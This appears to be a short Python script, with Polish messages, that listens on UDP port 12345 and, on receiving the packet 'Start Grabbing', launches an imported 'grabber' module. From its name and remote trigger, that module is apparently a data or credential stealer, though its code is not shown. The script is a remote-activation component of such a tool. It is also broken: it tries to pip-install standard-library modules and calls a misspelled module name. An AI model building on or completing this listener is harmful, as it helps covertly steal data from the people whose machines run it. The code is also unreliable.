import os

os.system("cls")
libraries = ["socket","subprocess"]

for library in libraries:
    os.system(f"pip install {library}")

os.system("cls")

import socket
import grabber

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))

        local_ip = s.getsockname()[0]

        return local_ip
    except socket.error as e:
        print(f"Error occurred: {e}")
    finally:
        s.close()

def start_server():
    ip_address = get_local_ip()
    port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((ip_address, port))

    while True:
        data, address = server_socket.recvfrom(1024)
        decoded_data = data.decode("utf-8")

        if decoded_data == "Start Grabbing":
            print(f"Otrzymano poprawny pakiet od {address} - Rozpoczynam Grabbera!")
            os.system("cls")
            graber.start_graber()
        else:
            pass


if __name__ == "__main__":
    start_server()
